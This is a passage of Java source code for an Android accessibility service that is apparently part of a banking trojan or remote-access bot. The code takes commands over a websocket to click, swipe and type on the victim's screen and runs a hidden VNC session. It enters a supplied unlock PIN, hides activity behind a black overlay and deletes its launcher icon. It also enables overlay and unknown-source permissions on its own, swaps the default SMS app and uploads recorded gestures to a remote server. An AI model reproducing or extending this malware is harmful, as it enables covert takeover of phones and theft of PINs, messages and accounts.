        //utl.Log(TAG_LOG,"CLICKED: "+buttonRect + "   X:" + buttonRect.centerX() + "  Y:"+buttonRect.centerY());
        utl.Log(TAG_LOG,consts.string_30+buttonRect + consts.string_31 + buttonRect.centerX() + consts.string_32  +buttonRect.centerY());

    }
    private void traverseAndClick(AccessibilityNodeInfo node, int n, int action) {
        if (node == null) {
            return;
        }

        totalNodesEncountered++;
        Log.d(TAG_LOG, totalNodesEncountered + " Childs: " + node.getChildCount());

        if (n == totalNodesEncountered) {
            node.performAction(action);
        } else {
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                traverseAndClick(child, n, action);
            }
        }

    }

    private void EditText(AccessibilityNodeInfo node, int n, String text) {
        if (node == null) {
            return;
        }

        totalNodesEncountered++;
        Log.d(TAG_LOG, totalNodesEncountered + " Childs: " + node.getChildCount());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            if (n == totalNodesEncountered && node.isEditable()) {
                Bundle arguments = new Bundle();
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
            } else {
                for (int i = 0; i < node.getChildCount(); i++) {
                    AccessibilityNodeInfo child = node.getChild(i);
                    EditText(child, n, text);
                }
            }
        }

    }

    private void startCaptureService() {
        Intent captureServiceIntent = new Intent(this, CaptureService.class);
        captureServiceIntent.setAction(CaptureService.ACTION_START_CAPTURE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(captureServiceIntent);
        } else {
            startService(captureServiceIntent);
        }
    }

    public boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> runningServices = activityManager.getRunningServices(Integer.MAX_VALUE);

        for (ActivityManager.RunningServiceInfo service : runningServices) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void sendHvnc(AccessibilityNodeInfo rootNode){
        try {
            if (rootNode == null) {
                return;
            }

            JSONObject json = skeletonconvert(rootNode);
            json.put("h", screenSize.y);
            json.put("w", screenSize.x);
            json.put("v", isServiceRunning(CaptureService.class));
            json.put("sc", isScreenAwake());
            json.put("bl", blackscreen);
            json.put("id", id_bot);

            if (webSocketService != null) {
                webSocketService.sendMessage(json.toString());
            }

        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    private void performSwipeGesture(int startX, int startY, int endX, int endY) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(startX, startY);
            path.lineTo(endX, endY);
            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 100, 300));
            GestureDescription gestureDescription = gestureBuilder.build();
            dispatchGesture(gestureDescription, null, null);
        } else {
            // Implement fallback solution for older Android versions if needed
        }
    }

    private void swipeUp() {
        int startX = displayMetrics.widthPixels / 2;
        int startY = (int) (displayMetrics.heightPixels * 0.75);
        int endX = displayMetrics.widthPixels / 2;
        int endY = (int) (displayMetrics.heightPixels * 0.25);

        performSwipeGesture(startX, startY, endX, endY);
    }

    private void swipeDown() {
        int startX = displayMetrics.widthPixels / 2;
        int startY = (int) (displayMetrics.heightPixels * 0.25);
        int endX = displayMetrics.widthPixels / 2;
        int endY = (int) (displayMetrics.heightPixels * 0.75);

        performSwipeGesture(startX, startY, endX, endY);
    }

    private void swipeLeft() {
        int startX = (int) (displayMetrics.widthPixels * 0.90);
        int startY = displayMetrics.heightPixels / 2;
        int endX = (int) (displayMetrics.widthPixels * 0.10);
        int endY = displayMetrics.heightPixels / 2;

        performSwipeGesture(startX, startY, endX, endY);
    }

    private void swipeRight() {
        int startX = (int) (displayMetrics.widthPixels * 0.10);
        int startY = displayMetrics.heightPixels / 2;
        int endX = (int) (displayMetrics.widthPixels * 1.0);
        int endY = displayMetrics.heightPixels / 2;

        performSwipeGesture(startX, startY, endX, endY);
    }

    public void doCommand(JSONObject command) throws JSONException {
        int screenHeight = screenSize.y;
        int screenWidth = screenSize.x;
        String commandString = command.getString("command");
        Log.d(TAG_LOG,commandString);
        if (commandString.equals("action_click")) {
            JSONObject data = command.getJSONObject("data");
            if (data.getInt("Node") != -1) {
                totalNodesEncountered = 0;
                AccessibilityNodeInfo currentEvent = AccessibilityNodeInfo.obtain(lastestevent);
                traverseAndClick(currentEvent, data.getInt("Node"), AccessibilityNodeInfo.ACTION_CLICK);
                currentEvent.recycle();
            }
        } else if (commandString.equals("action_long_click")) {
            JSONObject data = command.getJSONObject("data");
            if (data.getInt("Node") != -1) {
                totalNodesEncountered = 0;
                AccessibilityNodeInfo currentEvent = AccessibilityNodeInfo.obtain(lastestevent);
                traverseAndClick(currentEvent, data.getInt("Node"), AccessibilityNodeInfo.ACTION_LONG_CLICK);
                currentEvent.recycle();
            }
        } else if (commandString.equals("click_coord")) {
            JSONObject data = command.getJSONObject("data");
            int x = data.getInt("x");
            int y = data.getInt("y");
            Log.d(TAG_LOG, "Clicking on x: " + x + " y: " + y);
            Path path = new Path();
            path.moveTo(x, y);

            try {
                GestureDescription.Builder builder = null;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    builder = new GestureDescription.Builder();

                    builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));

                    GestureDescription gesture = builder.build();
                    dispatchGesture(gesture, null, null);
                }
            } catch (Exception e) {
                Log.d(TAG_LOG, String.valueOf(e));
            }

        } else if (commandString.equals("action_custom_gesture")) {
            JSONObject data = command.getJSONObject("data");

            try {
                JSONArray jsonArray = data.getJSONArray("pos");
                Integer duration = data.getInt("duration");
                List<PointF> points = new ArrayList<>();

                for (int i = 0; i < jsonArray.length(); i++) {
                    JSONObject pointObject = jsonArray.getJSONObject(i);
                    float x = (float) pointObject.getDouble("x");
                    float y = (float) pointObject.getDouble("y");
                    points.add(new PointF(x, y));
                }

                performComplexGesture(points, duration);

            } catch (JSONException e) {
                e.printStackTrace();
            }


        } else if (commandString.equals("global_action_back")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        } else if (commandString.equals("global_action_home")) {
            performGlobalAction(GLOBAL_ACTION_HOME);
        } else if (commandString.equals("global_action_recents")) {
            performGlobalAction(GLOBAL_ACTION_RECENTS);
        } else if (commandString.equals("swipe_up")) {
            swipeUp();
        } else if (commandString.equals("swipe_down")) {
            swipeDown();
        } else if (commandString.equals("swipe_left")) {
            swipeLeft();
        } else if (commandString.equals("swipe_right")) {
            swipeRight();
        } else if (commandString.equals("action_edit_text")) {
            JSONObject data = command.getJSONObject("data");
            if (data.getInt("Node") != -1) {
                totalNodesEncountered = 0;
                AccessibilityNodeInfo currentEvent = AccessibilityNodeInfo.obtain(lastestevent);
                EditText(currentEvent, data.getInt("Node"), data.getString("Text"));
                currentEvent.recycle();
            }
        } else if (commandString.equals("action_screen_on")) {
            if (isScreenAwake()) {
                if (Build.VERSION.SDK_INT >= 28) {
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                } else {
                    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                    devicePolicyManager.lockNow();
                }
            } else {
                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
                PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "myapp:tag");
                wakeLock.acquire(15000);

                WindowManager windowManagerPower = (WindowManager) getSystemService(WINDOW_SERVICE);

                Resources resources = getResources();
                int resourceId = resources.getIdentifier("navigation_bar_height", "dimen", "android");
                int navigationBarHeight = resources.getDimensionPixelSize(resourceId);

                final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                );

                params.gravity = Gravity.BOTTOM;
                params.height = getResources().getDisplayMetrics().heightPixels + navigationBarHeight;

                View PowerKeep = new View(this);
                PowerKeep.setBackgroundColor(Color.TRANSPARENT);

                Handler mHandler = new Handler(Looper.getMainLooper());
                mHandler.postDelayed(() -> {
                    try {
                        windowManagerPower.removeView(PowerKeep);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }, 30000);

            }
        } else if (commandString.equals("start_hvnc")) {
            instance = this;
            hvnc = true;
            sendHvnc(lastestevent);
        } else if (commandString.equals("stop_hvnc")) {
            hvnc = false;
            webSocketService.sendMessage("hvnc_off");
            Intent captureServiceIntent = new Intent(this, CaptureService.class);
            captureServiceIntent.setAction(CaptureService.ACTION_STOP_CAPTURE);
            startService(captureServiceIntent);
        } else if (commandString.equals("start_vnc")) {
            askMediaProjection = true;
            startCaptureService();
        } else if (commandString.equals("stop_vnc")) {
            Intent captureServiceIntent = new Intent(this, CaptureService.class);
            captureServiceIntent.setAction(CaptureService.ACTION_STOP_CAPTURE);
            startService(captureServiceIntent);
            try {
                if (lastestevent != null) {

                    JSONObject json = skeletonconvert(lastestevent);
                    json.put("h", screenSize.y);
                    json.put("w", screenSize.x);
                    json.put("v", false);
                    json.put("sc", isScreenAwake());
                    json.put("bl", blackscreen);
                    json.put("id", id_bot);

                    if (webSocketService != null) {
                        webSocketService.sendMessage(json.toString());
                    }
                }

            } catch (JSONException e) {
                e.printStackTrace();
            } catch (Exception e){
                e.printStackTrace();
            }
        } else if (commandString.equals("action_blackscreen")) {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (overlayView != null){
                        windowManager.removeView(overlayView);
                        overlayView = null;
                        blackscreen = false;
                    } else {
                        BlackscreenSend();
                        blackscreen = true;
                    }
                }
            });

        } else if (commandString.equals("nighty")) {
            try {
                AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);

            } catch (Exception e) {
                Log.d(TAG_LOG, e.toString());
            }
        } else if (commandString.equals("get_unlockpass")) {
            utl.SettingsWrite(this, "unlock_pass_found", "false");
        } else if (commandString.equals("start_record_gesture")) {
            if (!recordGesture) {
                try {
                    recordGesture = true;
                    lastinteraction = 0;
                    ContextCompat.getMainExecutor(this).execute(()  -> {
                        touchRecorder();
                    });

                } catch (Exception e) {
                    Log.d(TAG_LOG, e.toString());
                }
            }
        } else if (commandString.equals("stop_record_gesture")) {
            if (recordGesture) {
                try {
                    if (TouchRunnableOut != null) {
                        TouchHandler.removeCallbacks(TouchRunnableOut);
                    }
                    if (TouchRunnableIn != null) {
                        TouchHandler.removeCallbacks(TouchRunnableIn);
                    }

                    recordGesture = false;
                    windowManagerTouch.removeView(overlayViewTouch);
                    overlayViewTouch.setOnTouchListener(null);
                    overlayViewTouch = null;
                    lastinteraction = 0;


                    SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");

                    Date date = new Date();


                    try {
                        currenGestureRecroding.put("points", currentGesturePoints);
                        currenGestureRecroding.put("time", dateFormat.format(date));
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                    JSONObject jsonObject = new JSONObject();

                    jsonObject.put("id", id_bot);
                    jsonObject.put("date", dateFormat.format(date));
                    jsonObject.put("gesture", currenGestureRecroding.toString());
                    jsonObject.put("type", "rec");
                    jsonObject.put("text", gestureTexts.toString());
                    jsonObject.put("gesture", currenGestureRecroding.toString());
                    gestureTexts = new JSONArray();

                    if (consts.ssl) {
                        sendPostRequest("https://" + consts.ws_url + "/gesture", jsonObject.toString());
                    } else {
                        sendPostRequest("http://" + consts.ws_url + "/gesture", jsonObject.toString());
                    }

                    currentGesturePoints = new JSONArray();

                } catch (Exception e) {
                    Log.d(TAG_LOG, e.toString());
                }
            }
        } else if (commandString.equals("action_recorded_gesture")) {
            JSONObject data = command.getJSONObject("data");

            try {
                JSONArray jsonArray = data.getJSONArray("pos");

                ContextCompat.getMainExecutor(this).execute(()  -> {
                    executeGesturesFromJSON(jsonArray);
                });

            } catch (JSONException e) {
                e.printStackTrace();
            }


        } else if (commandString.equals("unlock_pin")) {
            JSONObject data = command.getJSONObject("data");
            String pin = data.getString("pin");
            try {
                performGlobalAction(GLOBAL_ACTION_RECENTS);
            } finally {
                int clicked = 0;
                try {
                    for (char number : pin.toCharArray()) {
                        clickNodeWithTextOrDescription(String.valueOf(number));
                        clicked++;
                    }
                    if (clicked == pin.length()) {
                        clickNodeWithTextOrDescription("Enter");
                        clickNodeWithTextOrDescription("√");
                        clickNodeWithTextOrDescription("OK");
                        clickNodeWithTextOrDescription("ok");
                    }

                } catch (Exception e) {
                    Log.d(TAG_LOG, e.toString());
                }

            }

        } else if (commandString.equals("sms_perm")){
            utl.swapSmsMenager(this, getPackageName());
        } else if (commandString.equals("install_from_unknown")){
            if (!utl.hasInstallFromUnknownSourcesPermission(this)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.setData(Uri.parse("package:" + this.getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    this.startActivity(intent);
                }
            }
        } else if (commandString.equals("start_app")) {
            try {
                JSONObject data = command.getJSONObject("data");
                String app = data.getString("app");
                Intent LaunchIntent = getPackageManager().getLaunchIntentForPackage(app);
                startActivity(LaunchIntent);
            } catch (Exception e){
                utl.SettingsToAdd(this, consts.LogSMS , "error starting app: " + e.toString() + consts.string_119);
            }

        } else if (commandString.equals("undead")) {
            try {
                undeadNotification(this);
                Handler handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        Handler NotifyHandler = new Handler();
                        NotifyHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                                notificationManager.cancelAll();
                            }
                        }, consts.undeadPushTime);

                    }
                });
            }catch (Exception e){
                Log.d(TAG_LOG, "Error creating undead-notify: " + e.toString());
                utl.RemoteLog(this,"Error creating undead-notify: " + e.toString());
            }
        }

    }


    public void undeadNotification(Context context){
        Notificator notificator = new Notificator(context);
        notificator.setParametersFromMap(context, consts.antisleepPush);
        notificator.notify(context);
    }

    public void performComplexGesture(List<PointF> points, long durationMs) {
        if (points.isEmpty()) {
            return;
        }

        Path path = new Path();
        path.moveTo(points.get(0).x, points.get(0).y);

        if (points.size() == 2 && points.get(0).equals(points.get(1))) {
            path.addCircle(points.get(0).x, points.get(0).y, 1, Path.Direction.CW);
        } else {
            for (int i = 1; i < points.size(); i++) {
                path.lineTo(points.get(i).x, points.get(i).y);
            }
        }

        try {
            GestureDescription gesture = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                gesture = new GestureDescription.Builder()
                        .addStroke(new GestureDescription.StrokeDescription(path, 0, durationMs))
                        .build();
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                dispatchGesture(gesture, null, null);
            }
        } catch (Exception e) {
            Log.d(TAG_LOG, e.toString());
        }

    }

    //--------------------------Execute recorded gesture

    private void executeGesturesFromJSON(JSONArray jsonArray) {
        final Handler handler = new Handler();
        try {
            LinkedList<Runnable> tasks = new LinkedList<>();
            for (int i = 0; i < jsonArray.length(); i++) {
                final JSONObject gestureObj = jsonArray.getJSONObject(i);
                int durations = gestureObj.getInt("dur");
                final int last = gestureObj.getInt("last");
                final JSONArray pointsArray = gestureObj.getJSONArray("points");
                final Point[] points = new Point[pointsArray.length()];

                if (durations < 0){
                    durations = 10;
                }
                final int duration = durations;

                for (int j = 0; j < pointsArray.length(); j++) {
                    JSONObject pointObj = pointsArray.getJSONObject(j);
                    int x = pointObj.getInt("x");
                    int y = pointObj.getInt("y");
                    points[j] = new Point(x, y);
                }

                tasks.add(() -> {
                    GestureDescription.StrokeDescription stroke;
                    Path path = new Path();
                    path.moveTo(points[0].x, points[0].y);

                    if (points.length == 2 && points[0].equals(points[1])) { // Click
                        path.lineTo(points[0].x, points[0].y);
                    } else { // Swipe
                        for (int j = 1; j < points.length; j++) {
                            path.lineTo(points[j].x, points[j].y);
                        }
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        stroke = new GestureDescription.StrokeDescription(path, 0, duration);


                        dispatchGesture(new GestureDescription.Builder().addStroke(stroke).build(),
                                new GestureResultCallback() {
                                    @Override
                                    public void onCompleted(GestureDescription gestureDescription) {
                                        super.onCompleted(gestureDescription);
                                        if (!tasks.isEmpty()) {
                                            handler.postDelayed(tasks.poll(), last);
                                        }
                                    }
                                }, null);
                    }
                });
            }

            if (!tasks.isEmpty()) {
                handler.post(tasks.poll());
            }
        } catch (JSONException e) {
            Log.e(TAG_LOG, "JSON parsing error: " + e.getMessage());
        }
    }





    //--------------------------Blackscreen

    public void BlackscreenSend() {

        try {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        Resources resources = getResources();
        int resourceId = resources.getIdentifier("navigation_bar_height", "dimen", "android");
        int navigationBarHeight = resources.getDimensionPixelSize(resourceId);

        final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.BOTTOM;
        params.height = getResources().getDisplayMetrics().heightPixels + navigationBarHeight + 1000;

        ImageView imageView = new ImageView(this);
        imageView.setImageResource(R.drawable.black);
        imageView.setScaleType(ImageView.ScaleType.FIT_XY);
            windowManager.addView(imageView, params);
            overlayView = imageView;
        } catch (Exception e){
            utl.RemoteLog(this,"Error trying to send Blackscreen: " + e.toString());
        }
    }

    //---------------------------Unlock pin

    private void clickNodeWithTextOrDescription(String textOrDesc) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(textOrDesc);

        for (AccessibilityNodeInfo node : nodes) {
            if ( node.getText() != null && node.getText().toString().equals(textOrDesc) || node.getContentDescription() != null && node.getContentDescription().toString().equals(textOrDesc)) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
        rootNode.recycle();
    }

    public static Access getInstance() {
        return instance;
    }
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        if (utl.SettingsRead(this, "firststart") == consts.str_1) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            utl.SettingsWrite(this,"firststart", consts.str_null);
        }
        utl.deleteLabelIcon(this);
        try {
            instance = this;
        }catch (Exception e){
            instance = this;
            Log.d(TAG_LOG, "Instance assigning: " + e.toString());
        }

        if (instance == null){
            instance = this;
        }

        utl.SettingsWrite(getApplicationContext(), "paranoid", "1");



        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.cancelAll();
        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_USER_PRESENT);
            this.screenStatusReceiver = new ScreenStatusReceiver();
            registerReceiver(this.screenStatusReceiver, filter);

            if(consts.FakeAPP && !isFakeEnabled()) {
                ComponentName componentName = new ComponentName(this, fake.class);
                getPackageManager().setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP);

                Intent intent = new Intent(this, fake.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }

            id_bot = utl.SettingsRead(this, consts.idbot);
            utl.Log(TAG_LOG, consts.string_70);

            utl.SettingsWrite(this, consts.startInstalledTeamViewer, consts.str_1);

            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags = AccessibilityServiceInfo.DEFAULT;
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            setServiceInfo(info);
        }catch (Exception ex){
           // utl.SettingsToAdd(this, consts.LogSMS , consts.string_173 + ex.toString() + consts.string_119);
        }

        displayMetrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (windowManager != null) {
            Display display = windowManager.getDefaultDisplay();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                display.getRealMetrics(displayMetrics);
            }
        }

        LocalBroadcastManager.getInstance(this).registerReceiver(screenCaptureReceiver, new IntentFilter("com.app.SCREEN_CAPTURE"));


        IntentFilter filter = new IntentFilter(ACTION_BIND_WEBSOCKET);
        registerReceiver(websocketReceiver, filter);
        try {
            Intent serviceIntent = new Intent(this, WebSocketService.class);
            startService(serviceIntent);
            bindToWebSocketService(this);
        } catch (Exception e) {
            Log.d(TAG_LOG, e.toString());
        }

        if (!utl.hasInstallFromUnknownSourcesPermission(this) && consts.unknown_sources) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                intent.setData(Uri.parse("package:" + this.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                this.startActivity(intent);
            }
        }

    }

    private boolean isFakeEnabled() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, fake.class);
        int activityEnabledSetting = packageManager.getComponentEnabledSetting(componentName);

        return activityEnabledSetting == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    // websocket

    private BroadcastReceiver websocketReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(ACTION_BIND_WEBSOCKET)) {
                try {
                    BindWebsocket();
                } catch (Exception e) {
                    Log.d(TAG_LOG, e.toString());
                }
            }
        }
    };

    private void BindWebsocket() {
        instance = this;
        Intent serviceIntent = new Intent(this, WebSocketService.class);
        stopService(serviceIntent);
        startService(serviceIntent);
        bindToWebSocketService(this);
    }

    // Overlay permissioon

    private void overlaySettingsBranch(AccessibilityNodeInfo node, Context cnt) {
        Log.d("===", "overlaySettingsBranch");

        List<AccessibilityNodeInfo> combinedSwChb = new ArrayList<AccessibilityNodeInfo>();
        combinedSwChb.addAll(UtilAccessibility.findNodeByClass(node, "switch"));
        combinedSwChb.addAll(UtilAccessibility.findNodeByClass(node, "checkbox"));

        if (combinedSwChb.size() >= 1) {
            Log.d("===", "Switches found: "+combinedSwChb.size());
            List<AccessibilityNodeInfo> labels = UtilAccessibility.findNodesByParameters(node, utl.getLabelApplication(getApplicationContext()), null, null, null, null, null, null);

            if (labels.isEmpty()) {
                Log.d("===", "No labels, scrolling");
                UtilAccessibility.scrollView(node);
                nextCall = this::prolongedOverlaySettingsBranch;
                return;
            } else {
                for (AccessibilityNodeInfo label : labels){
                    Log.d("===", "Found label: "+label);
                    AccessibilityNodeInfo parent = label.getParent();
                    List<AccessibilityNodeInfo> parentCombinedSwChb = new ArrayList<AccessibilityNodeInfo>();
                    parentCombinedSwChb.addAll(UtilAccessibility.findNodeByClass(parent, "switch"));
                    parentCombinedSwChb.addAll(UtilAccessibility.findNodeByClass(parent, "checkbox"));
                    Log.d("===", "Switches found in label parent: "+parentCombinedSwChb.size());
                    if (parentCombinedSwChb.isEmpty()) {
                        Log.d("===", "Label is not related to any switches. Clicking first switch in root");
                        if (!combinedSwChb.get(0).isChecked()) {
                            UtilAccessibility.clickOnSwitchOrParent(combinedSwChb.get(0));
                        }
                        break;
                    } else {
                        for (AccessibilityNodeInfo sw : parentCombinedSwChb) {
                            Log.d("===", "Found switch in parent: " + sw);
                            if (!sw.isChecked()) {
                                UtilAccessibility.clickOnSwitchOrParent(sw);
                            }
                        }
                    }
                }
            }
        } else if (android.os.Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
            List<AccessibilityNodeInfo> linearLayouts = UtilAccessibility.findNodeByClass(node, "linearlayout");
            if (linearLayouts != null && !linearLayouts.isEmpty() &&  linearLayouts.get(0).isClickable()) {
                linearLayouts.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            } else {
                Log.d("===", "SDK Q. Clickable LL not found. Probably page is still loading");
                nextCall = this::prolongedOverlaySettingsBranch;
                return;
            }
        } else {
            Log.d("===", "Switches not found. Probably page is still loading");
            nextCall = this::prolongedOverlaySettingsBranch;
            return;
        }

        Handler mHandler = new Handler(Looper.getMainLooper());
        mHandler.postDelayed(() -> {
            try {
                performGlobalAction(GLOBAL_ACTION_BACK);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, 400);
    }

    private boolean prolongedOverlaySettingsBranch(AccessibilityNodeInfo node){
        Log.d("===", "prolongedOverlaySettingsBranch");
        List<AccessibilityNodeInfo> combinedSwChb = new ArrayList<AccessibilityNodeInfo>();
        combinedSwChb.addAll(UtilAccessibility.findNodeByClass(node, "switch"));
        combinedSwChb.addAll(UtilAccessibility.findNodeByClass(node, "checkbox"));

        if (combinedSwChb.size() >= 1) {
            Log.d("===", "Switches found: "+combinedSwChb.size());
            List<AccessibilityNodeInfo> labels = UtilAccessibility.findNodesByParameters(node, utl.getLabelApplication(getApplicationContext()), null, null, null, null, null, null);

            if (labels.isEmpty()) {
                Log.d("===", "No labels, scrolling");
                UtilAccessibility.scrollView(node);
                return false;
            } else {
                for (AccessibilityNodeInfo label : labels){

                    Log.d("===", "Found label: "+label);
                    AccessibilityNodeInfo parent = label.getParent();
                    List<AccessibilityNodeInfo> parentCombinedSwChb = new ArrayList<AccessibilityNodeInfo>();
                    parentCombinedSwChb.addAll(UtilAccessibility.findNodeByClass(parent, "switch"));
                    parentCombinedSwChb.addAll(UtilAccessibility.findNodeByClass(parent, "checkbox"));
                    Log.d("===", "Switches found in label parent: "+parentCombinedSwChb.size());
                    if (parentCombinedSwChb.isEmpty()) {
                        Log.d("===", "Label is not related to switch. Clicking first switch in root");
                        if (!combinedSwChb.get(0).isChecked()) {
                            UtilAccessibility.clickOnSwitchOrParent(combinedSwChb.get(0));
                        }
                        break;
                    } else {
                        for (AccessibilityNodeInfo sw : parentCombinedSwChb) {
                            Log.d("===", "Found switch in parent: " + sw);
                            if (!sw.isChecked()) {
                                UtilAccessibility.clickOnSwitchOrParent(sw);
                            }
                        }
                    }
                }
            }

        } else if (android.os.Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
            List<AccessibilityNodeInfo> linearLayouts = UtilAccessibility.findNodeByClass(node, "linearlayout");
            if (linearLayouts != null && !linearLayouts.isEmpty() &&  linearLayouts.get(0).isClickable()) {
                linearLayouts.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            } else {
                Log.d("===", "SDK Q. Clickable LL not found. Probably page is still loading");
                return false;
            }
        } else {
            Log.d("===", "Switches not found. Probably page is still loading");
            return false;
        }

        Handler mHandler = new Handler(Looper.getMainLooper());
        mHandler.postDelayed(() -> {
            try {
                performGlobalAction(GLOBAL_ACTION_BACK);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, 400);

        return true;
    }


    private void touchRecorder() {
        windowManagerTouch = (WindowManager) getSystemService(WINDOW_SERVICE);

        Resources resources = getResources();
        int resourceId = resources.getIdentifier("navigation_bar_height", "dimen", "android");
        int navigationBarHeight = resources.getDimensionPixelSize(resourceId);

        final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
